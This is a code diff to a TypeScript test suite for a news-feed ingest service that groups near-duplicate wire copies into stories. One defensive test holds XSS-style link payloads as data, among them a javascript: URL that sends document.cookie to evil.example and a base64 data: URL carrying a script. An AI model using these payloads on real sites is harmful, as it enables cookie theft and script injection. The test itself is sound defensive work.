@@ -20,6 +20,7 @@ import {
   makeTestClock,
   resetDeterministic,
 } from '../testing/test-clocks.js';
+import { UNRELATED_REPORTS, WIRE_COPIES } from '../testing/story-fixtures.js';
 import type { Source, SourceId } from '../domain/types.js';
 import { isSafeExternalUrl } from '../domain/url.js';
 
@@ -52,57 +53,47 @@ function makeEntry(
   };
 }
 
-const CLUSTER_A_BODY =
-  'Acme Corp today unveiled a new AI product called Foo, analysts said. The launch changes the landscape for enterprise customers.';
+const HOUR = 60 * 60 * 1000;
 
-const CLUSTER_A_ENTRIES: readonly RawFeedEntry[] = [
+/** A feed of one story as a syndication desk would have delivered it. */
+const WIRE_ENTRIES: readonly RawFeedEntry[] = WIRE_COPIES.map((copy, i) =>
   makeEntry(
-    'a-1',
-    new Date('2026-09-02T10:00:00Z'),
-    'Acme Corp launches new AI product',
-    CLUSTER_A_BODY,
+    `wire-${i}`,
+    new Date(new Date('2026-09-02T10:00:00Z').getTime() + i * 60_000),
+    copy.headline,
+    copy.body,
   ),
-  makeEntry(
-    'a-2',
-    new Date('2026-09-02T10:30:00Z'),
-    'Acme Corp unveils new AI product',
-    CLUSTER_A_BODY,
-  ),
-  makeEntry(
-    'a-3',
-    new Date('2026-09-02T11:00:00Z'),
-    'Acme Corp announces new AI product',
-    CLUSTER_A_BODY,
-  ),
-  makeEntry(
-    'a-4',
-    new Date('2026-09-02T11:30:00Z'),
-    'Acme Corp debuts new AI product',
-    CLUSTER_A_BODY,
-  ),
-];
+);
 
-const CLUSTER_B_BODY =
-  'BrandX Inc announced today that it acquired TinyCo for $2B. The deal closed on Tuesday.';
+/** A feed of reports about six different things, published in the same window. */
+const UNRELATED_ENTRIES: readonly RawFeedEntry[] = UNRELATED_REPORTS.map(
+  (report, i) =>
+    makeEntry(
+      `unrelated-${i}`,
+      new Date(new Date('2026-09-02T10:00:00Z').getTime() + i * 10 * 60_000),
+      report.headline,
+      report.body,
+    ),
+);
 
 const CLUSTER_B_ENTRIES: readonly RawFeedEntry[] = [
   makeEntry(
     'b-1',
     new Date('2026-09-02T12:00:00Z'),
     'BrandX Inc acquires TinyCo',
-    CLUSTER_B_BODY,
+    'BrandX Inc said it had completed the acquisition of TinyCo for $2 billion, ending a process that began nine months ago. Shares in BrandX rose 4 percent in afternoon trading.',
   ),
   makeEntry(
     'b-2',
     new Date('2026-09-02T12:30:00Z'),
     'BrandX Inc completes TinyCo acquisition',
-    CLUSTER_B_BODY,
+    'The $2 billion TinyCo takeover is complete, BrandX Inc said, after nine months of negotiations. Shares in BrandX rose 4 percent in afternoon trading.',
   ),
   makeEntry(
     'b-3',
     new Date('2026-09-02T13:00:00Z'),
-    'TinyCo bought by BrandX Inc',
-    CLUSTER_B_BODY,
+    'TinyCo bought by BrandX Inc for $2 billion',
+    'BrandX Inc has finished buying TinyCo for $2 billion, the company said on Tuesday. Shares in BrandX rose 4 percent in afternoon trading.',
   ),
 ];
 
@@ -183,28 +174,27 @@ async function buildService(input: BuildInput): Promise<BuildResult> {
   };
 }
 
+async function storyIdsFor(
+  articleRepo: ArticleRepo,
+  source: Source,
+  entries: readonly RawFeedEntry[],
+): Promise<Set<string>> {
+  const ids = new Set<string>();
+  for (const entry of entries) {
+    const article = await articleRepo.findByExternalId(source.id, entry.externalId);
+    if (article?.storyId) ids.add(article.storyId);
+  }
+  return ids;
+}
+
 describe('IngestService', () => {
   beforeEach(() => {
     resetDeterministic();
   });
 
-  it('merges 20+ near-duplicate syndication articles into a single Story (acceptance criterion)', async () => {
-    const syndicationTitle = 'Acme Corp launches new AI product';
-    const syndicationBody =
-      'Acme Corp today unveiled a new AI product called Foo, analysts said. The launch changes the landscape for enterprise customers worldwide.';
-    const variants: RawFeedEntry[] = [];
-    const base = new Date('2026-09-02T10:00:00Z');
-    for (let i = 0; i < 22; i++) {
-      variants.push({
-        externalId: `acme-cluster-${i}`,
-        url: `https://www.reuters.com/article/acme-cluster-${i}`,
-        title: syndicationTitle,
-        body: syndicationBody,
-        publishedAt: new Date(base.getTime() + i * 60_000),
-      });
-    }
+  it('collapses 22 genuinely varied wire copies of one story into a single Story', async () => {
     const { service, storyRepo, articleRepo, source } = await buildService({
-      entries: { entries: variants },
+      entries: { entries: WIRE_ENTRIES },
     });
 
     const report = await service.ingestSource(source.id);
@@ -214,24 +204,91 @@ describe('IngestService', () => {
     expect(report.inserted + report.merged).toBe(22);
     expect(report.storiesAffected).toBe(1);
 
-    const seenStoryIds = new Set<string>();
-    for (const v of variants) {
-      const article = await articleRepo.findByExternalId(
-        source.id,
-        v.externalId,
-      );
-      expect(article).not.toBeNull();
-      expect(article?.storyId).not.toBeNull();
-      if (article?.storyId) seenStoryIds.add(article.storyId);
-    }
+    // Every copy has a different headline and a different body, so this is not
+    // the same input twenty-two times over.
+    expect(new Set(WIRE_ENTRIES.map((e) => e.body)).size).toBe(22);
+    expect(new Set(WIRE_ENTRIES.map((e) => e.title)).size).toBe(22);
+
+    const seenStoryIds = await storyIdsFor(articleRepo, source, WIRE_ENTRIES);
     expect(seenStoryIds.size).toBe(1);
     const storyId = seenStoryIds.values().next().value as string;
     const story = await storyRepo.getById(storyId as never);
     expect(story?.articleCount).toBe(22);
   });
 
+  it('keeps unrelated reports from the same window in separate Stories', async () => {
+    const { service, storyRepo, articleRepo, source } = await buildService({
+      entries: { entries: UNRELATED_ENTRIES },
+    });
+
+    const report = await service.ingestSource(source.id);
+
+    expect(report.success).toBe(true);
+    expect(report.storiesAffected).toBe(UNRELATED_REPORTS.length);
+    const seenStoryIds = await storyIdsFor(articleRepo, source, UNRELATED_ENTRIES);
+    expect(seenStoryIds.size).toBe(UNRELATED_REPORTS.length);
+    for (const id of seenStoryIds) {
+      const story = await storyRepo.getById(id as never);
+      expect(story?.articleCount).toBe(1);
+    }
+  });
+
+  it('persists the key phrases it signed an Article with, and reads them back', async () => {
+    const { service, articleRepo, source } = await buildService({
+      entries: { entries: [WIRE_ENTRIES[0]!] },
+    });
+    await service.ingestSource(source.id);
+
+    const stored = await articleRepo.findByExternalId(source.id, 'wire-0');
+    expect(stored).not.toBeNull();
+    // Half of the matching key used to live only in memory during ingest and was
+    // always read back empty.
+    expect(stored?.signature.phrases.length).toBeGreaterThan(0);
+    expect(stored?.signature.words.length).toBeGreaterThan(0);
+    expect(stored?.signature.phrases).toContain('acme corp unveiled');
+  });
+
+  it('measures the dedup window from when an Article was published, not from when it was polled', async () => {
+    // A feed that still lists a report from last week alongside today's. Both
+    // are the same story in the same poll, and a window measured from the poll
+    // would fold them into one Story.
+    const copy = WIRE_COPIES[0]!;
+    const pollAt = new Date('2026-09-02T12:00:00Z');
+    const stale = new Date(pollAt.getTime() - 5 * 24 * HOUR);
+    const entries: RawFeedEntry[] = [
+      makeEntry('stale', stale, 'Acme unveils Foo, an AI assistant', copy.body),
+      makeEntry(
+        'current',
+        pollAt,
+        'Acme launches AI assistant Foo',
+        WIRE_COPIES[1]!.body,
+      ),
+    ];
+    const { service, storyRepo, articleRepo, source } = await buildService({
+      entries: { entries },
+      pollAt,
+    });
+
+    const report = await service.ingestSource(source.id);
+
+    expect(report.success).toBe(true);
+    expect(report.storiesAffected).toBe(2);
+    const staleStoryId = (
+      await articleRepo.findByExternalId(source.id, 'stale')
+    )?.storyId;
+    const currentStoryId = (
+      await articleRepo.findByExternalId(source.id, 'current')
+    )?.storyId;
+    expect(staleStoryId).not.toBeNull();
+    expect(staleStoryId).not.toBe(currentStoryId);
+    expect((await storyRepo.getById(staleStoryId as never))?.articleCount).toBe(1);
+    expect((await storyRepo.getById(currentStoryId as never))?.articleCount).toBe(
+      1,
+    );
+  });
+
   it('clusters two distinct stories into separate Stories with correct article counts', async () => {
-    const entries = [...CLUSTER_A_ENTRIES, ...CLUSTER_B_ENTRIES];
+    const entries = [...WIRE_ENTRIES, ...CLUSTER_B_ENTRIES];
     const { service, storyRepo, articleRepo, source } = await buildService({
       entries: { entries },
     });
@@ -253,7 +310,7 @@ describe('IngestService', () => {
       const articles = await articleRepo.listByStory(id as never);
       counts.push(articles.length);
     }
-    expect([...counts].sort()).toEqual([3, 4]);
+    expect([...counts].sort((a, b) => a - b)).toEqual([3, 22]);
 
     for (const id of storyIds) {
       const story = await storyRepo.getById(id as never);
@@ -262,17 +319,32 @@ describe('IngestService', () => {
   });
 
   it('is idempotent: re-ingesting the same feed reports no new merges', async () => {
-    const entries = [...CLUSTER_A_ENTRIES, ...CLUSTER_B_ENTRIES];
-    const { service, source } = await buildService({
+    const entries = [...WIRE_ENTRIES, ...CLUSTER_B_ENTRIES];
+    const { service, storyRepo, articleRepo, source } = await buildService({
       entries: { entries },
     });
     const r1 = await service.ingestSource(source.id);
     expect(r1.inserted + r1.merged).toBe(entries.length);
+    const storyIdsAfterFirst = await storyIdsFor(articleRepo, source, entries);
 
     const r2 = await service.ingestSource(source.id);
     expect(r2.inserted).toBe(0);
     expect(r2.merged).toBe(0);
     expect(r2.fetched).toBe(entries.length);
+
+    // And nothing moved: a second pass over the same feed is the same Stories.
+    expect(await storyIdsFor(articleRepo, source, entries)).toEqual(
+      storyIdsAfterFirst,
+    );
+    const counts: number[] = [];
+    for (const id of storyIdsAfterFirst) {
+      const story = await storyRepo.getById(id as never);
+      counts.push(story?.articleCount ?? 0);
+    }
+    expect(counts.sort((a, b) => a - b)).toEqual([
+      CLUSTER_B_ENTRIES.length,
+      WIRE_ENTRIES.length,
+    ]);
   });
 
   it('skips a source whose feed_url is null', async () => {
@@ -309,26 +381,27 @@ describe('IngestService', () => {
 
   it('persists the linked entities for each article', async () => {
     const { service, articleRepo, source } = await buildService({
-      entries: { entries: CLUSTER_A_ENTRIES },
+      entries: { entries: WIRE_ENTRIES.slice(0, 2) },
     });
     await service.ingestSource(source.id);
 
-    const sample = await articleRepo.findByExternalId(source.id, 'a-1');
+    const sample = await articleRepo.findByExternalId(source.id, 'wire-0');
     expect(sample).not.toBeNull();
     expect(sample?.entities.length).toBeGreaterThan(0);
     const names = sample?.entities.map((e) => e.canonicalName) ?? [];
     expect(names).toContain('Acme Corp');
 
-    // Same canonical entity should be reused across articles.
-    const sample2 = await articleRepo.findByExternalId(source.id, 'a-2');
-    const entityIds = (sample?.entities ?? []).map((e) => e.id).sort();
-    const entityIds2 = (sample2?.entities ?? []).map((e) => e.id).sort();
-    expect(entityIds).toEqual(entityIds2);
+    // The same canonical entity is one row reused across Articles, not a fresh
+    // one per Article, or nothing downstream can group by it.
+    const sample2 = await articleRepo.findByExternalId(source.id, 'wire-1');
+    const idOf = (article: typeof sample, name: string): string | undefined =>
+      article?.entities.find((e) => e.canonicalName === name)?.id;
+    expect(idOf(sample2, 'Acme Corp')).toBe(idOf(sample, 'Acme Corp'));
   });
 
   it('touches the story lastSeenAt when a new article merges into it', async () => {
-    const firstEntry = CLUSTER_A_ENTRIES[0]!;
-    const secondEntry = CLUSTER_A_ENTRIES[1]!;
+    const firstEntry = WIRE_ENTRIES[0]!;
+    const secondEntry = WIRE_ENTRIES[1]!;
     const { service, storyRepo, articleRepo, source, clock, replaceFetcher } =
       await buildService({
         entries: { entries: [firstEntry] },
@@ -345,7 +418,7 @@ describe('IngestService', () => {
     const firstSeen = initialStory?.firstSeenAt;
     expect(firstSeen?.getTime()).toBe(t0.getTime());
 
-    clock.advance(60 * 60 * 1000);
+    clock.advance(HOUR);
     const t1 = clock.clock.now();
     replaceFetcher(
       new StaticFeedFetcher({
@@ -359,16 +432,44 @@ describe('IngestService', () => {
     expect(updated?.firstSeenAt.getTime()).toBe(firstSeen?.getTime());
   });
 
-  it('does not merge articles that fall outside the 72-hour window', async () => {
-    const baseEntry = CLUSTER_A_ENTRIES[0]!;
+  it('widens the story published range as copies published around it arrive', async () => {
+    const first = WIRE_ENTRIES[0]!;
+    const later = {
+      ...WIRE_ENTRIES[1]!,
+      externalId: 'wire-later',
+      publishedAt: new Date(first.publishedAt.getTime() + 30 * HOUR),
+    };
+    const { service, storyRepo, articleRepo, source, replaceFetcher } =
+      await buildService({
+        entries: { entries: [first] },
+      });
+    await service.ingestSource(source.id);
+    const storyId = (
+      await articleRepo.findByExternalId(source.id, 'wire-0')
+    )?.storyId;
+    if (!storyId) throw new Error('expected a story id');
+
+    replaceFetcher(new StaticFeedFetcher({ entries: [later] }));
+    await service.ingestSource(source.id);
+
+    const story = await storyRepo.getById(storyId as never);
+    expect(story?.articleCount).toBe(2);
+    expect(story?.published.first).toEqual(first.publishedAt);
+    expect(story?.published.last).toEqual(later.publishedAt);
+  });
+
+  it('does not merge articles that were published more than 72 hours apart', async () => {
+    const copy = WIRE_COPIES[0]!;
     const t0 = new Date('2026-09-01T10:00:00Z');
     const tPast = new Date('2026-09-02T10:00:00Z');
-    const tFuture = t0.getTime() + 5 * 24 * 60 * 60 * 1000;
+    const tFuture = t0.getTime() + 5 * 24 * HOUR;
     const { service, storyRepo, articleRepo, source, replaceFetcher, clock } =
       await buildService({
         entries: {
           entries: [
-            { ...baseEntry, externalId: 'old', publishedAt: t0 },
+            {
+              ...makeEntry('old', t0, copy.headline, copy.body),
+            },
           ],
         },
         pollAt: tPast,
@@ -386,7 +487,7 @@ describe('IngestService', () => {
     replaceFetcher(
       new StaticFeedFetcher({
         entries: [
-          { ...baseEntry, externalId: 'new', publishedAt: new Date(tFuture) },
+          makeEntry('new', new Date(tFuture), copy.headline, WIRE_COPIES[1]!.body),
         ],
       }),
     );
@@ -408,17 +509,49 @@ describe('IngestService', () => {
     expect(fresh?.articleCount).toBe(1);
   });
 
-  it('merges articles that match fingerprint within the 72-hour window', async () => {
-    const baseEntry = CLUSTER_A_ENTRIES[0]!;
+  it('does not let a chain of in-window copies walk a Story out of its window', async () => {
+    // Each of these Articles is inside 72 hours of the one before it, so a Story
+    // that accepted all of them would span more than two months — which is the
+    // same mistake as measuring the window from when a poll happened.
+    const first = WIRE_ENTRIES[0]!;
+    const entries: RawFeedEntry[] = [first];
+    for (let i = 1; i < 8; i++) {
+      entries.push({
+        ...WIRE_ENTRIES[i]!,
+        externalId: `chain-${i}`,
+        publishedAt: new Date(first.publishedAt.getTime() + i * 60 * HOUR),
+      });
+    }
+    const { service, storyRepo, articleRepo, source } = await buildService({
+      entries: { entries },
+      pollAt: new Date(first.publishedAt.getTime() + 7 * 60 * HOUR),
+    });
+
+    await service.ingestSource(source.id);
+
+    // The invariant that matters is not how many Stories this made, but that no
+    // Story ended up wider than the window: a chain of near-duplicates can open
+    // new Stories, never stretch one.
+    const storyIds = await storyIdsFor(articleRepo, source, entries);
+    expect(storyIds.size).toBeGreaterThan(1);
+    for (const id of storyIds) {
+      const story = await storyRepo.getById(id as never);
+      const spanHours =
+        (story!.published.last.getTime() - story!.published.first.getTime()) /
+        HOUR;
+      expect(spanHours, `story ${id} spans ${spanHours}h`).toBeLessThanOrEqual(72);
+    }
+  });
+
+  it('merges copies published inside the 72-hour window', async () => {
+    const copy = WIRE_COPIES[0]!;
     const t0 = new Date('2026-09-01T10:00:00Z');
     const tInside = new Date('2026-09-02T10:00:00Z');
-    const tJustInside = t0.getTime() + 71 * 60 * 60 * 1000;
+    const tJustInside = t0.getTime() + 71 * HOUR;
     const { service, storyRepo, articleRepo, source, replaceFetcher, clock } =
       await buildService({
         entries: {
-          entries: [
-            { ...baseEntry, externalId: 'first', publishedAt: t0 },
-          ],
+          entries: [makeEntry('first', t0, copy.headline, copy.body)],
         },
         pollAt: tInside,
       });
@@ -428,11 +561,12 @@ describe('IngestService', () => {
     replaceFetcher(
       new StaticFeedFetcher({
         entries: [
-          {
-            ...baseEntry,
-            externalId: 'second',
-            publishedAt: new Date(tJustInside),
-          },
+          makeEntry(
+            'second',
+            new Date(tJustInside),
+            WIRE_COPIES[1]!.headline,
+            WIRE_COPIES[1]!.body,
+          ),
         ],
       }),
     );
@@ -454,7 +588,7 @@ describe('IngestService', () => {
   });
 
   it('records a success when a poll finds nothing new, so a healthy Source is not reported stale', async () => {
-    const entry = CLUSTER_A_ENTRIES[0]!;
+    const entry = WIRE_ENTRIES[0]!;
     const { service, sourceRepo, source, clock, replaceFetcher } = await buildService({
       entries: { entries: [entry] },
     });
@@ -466,7 +600,7 @@ describe('IngestService', () => {
 
     // The second poll sees the same feed and inserts nothing. It still worked,
     // so the Source's last success has to move or the dashboard calls it stale.
-    clock.advance(60 * 60 * 1000);
+    clock.advance(HOUR);
     replaceFetcher(new StaticFeedFetcher({ entries: [entry] }));
     const second = await service.ingestSource(source.id);
     expect(second.success).toBe(true);
@@ -490,26 +624,26 @@ describe('IngestService', () => {
   });
 
   it('stores a link the feed gave us only when the scheme is safe to link to', async () => {
+    const copy = WIRE_COPIES[0]!.body;
     const entries: RawFeedEntry[] = [
-      {
-        externalId: 'good',
-        url: 'https://www.reuters.com/article/good',
-        title: 'Acme Corp ships a widget',
-        body: CLUSTER_A_BODY,
-        publishedAt: new Date('2026-09-02T10:00:00Z'),
-      },
+      makeEntry(
+        'good',
+        new Date('2026-09-02T10:00:00Z'),
+        'Acme Corp ships a widget',
+        copy,
+      ),
       {
         externalId: 'hostile-js',
         url: 'javascript:fetch("https://evil.example/"+document.cookie)',
         title: 'Acme Corp ships a gadget',
-        body: CLUSTER_A_BODY,
+        body: copy,
         publishedAt: new Date('2026-09-02T10:05:00Z'),
       },
       {
         externalId: 'hostile-data',
         url: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
         title: 'Acme Corp ships a gizmo',
-        body: CLUSTER_A_BODY,
+        body: copy,
         publishedAt: new Date('2026-09-02T10:10:00Z'),
       },
     ];
@@ -542,20 +676,23 @@ describe('IngestService', () => {
     expect((await articleRepo.findByExternalId(source.id, 'hostile-data'))?.url).toBe('');
   });
 
-  it('keeps a hostile entry out of the Story its safe siblings would join', async () => {
-    const hostile = CLUSTER_A_ENTRIES[0]!;
+  it('keeps a hostile entry in the Story its safe siblings would join', async () => {
+    const copy = WIRE_COPIES[0]!;
     const { service, storyRepo, articleRepo, source } = await buildService({
       entries: {
         entries: [
+          makeEntry(
+            'safe-one',
+            new Date('2026-09-02T10:00:00Z'),
+            copy.headline,
+            copy.body,
+          ),
           {
-            ...hostile,
-            externalId: 'safe-one',
-            url: 'https://www.reuters.com/article/safe-one',
-          },
-          {
-            ...hostile,
             externalId: 'hostile',
             url: 'javascript:alert(1)',
+            title: WIRE_COPIES[1]!.headline,
+            body: WIRE_COPIES[1]!.body,
+            publishedAt: new Date('2026-09-02T10:05:00Z'),
           },
         ],
       },
@@ -571,7 +708,7 @@ describe('IngestService', () => {
     )?.storyId;
     expect(safeStory).not.toBeNull();
     expect(hostileStory).not.toBeNull();
-    // Same text, so they are the same Story; the difference is only the link.
+    // Same event, differently worded; the difference is only the link.
     expect(hostileStory).toBe(safeStory);
     const story = await storyRepo.getById(safeStory as never);
     expect(story?.articleCount).toBe(2);
